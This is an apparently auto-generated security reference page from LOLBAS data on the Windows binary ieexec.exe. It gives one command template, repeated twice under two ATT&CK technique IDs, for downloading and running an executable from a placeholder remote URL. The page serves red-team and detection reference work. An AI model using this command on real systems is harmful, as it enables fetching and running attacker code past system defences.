---
parsed_by: focuslocust
source: commands
type: generated
---
# Ieexec Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Ieexec.exe

Tool page: [Ieexec.exe](../../tools/windows/ieexec.exe.md)

### Download and run attacker code from remote location

```text
ieexec.exe {REMOTEURL:.exe}
```

Description:

Downloads and executes executable from the remote server.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ieexec.yml` |
| Evidence | Command preserved from source parser. |

### Download and run attacker code from remote location

```text
ieexec.exe {REMOTEURL:.exe}
```

Description:

Downloads and executes executable from the remote server.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ieexec.yml` |
| Evidence | Command preserved from source parser. |
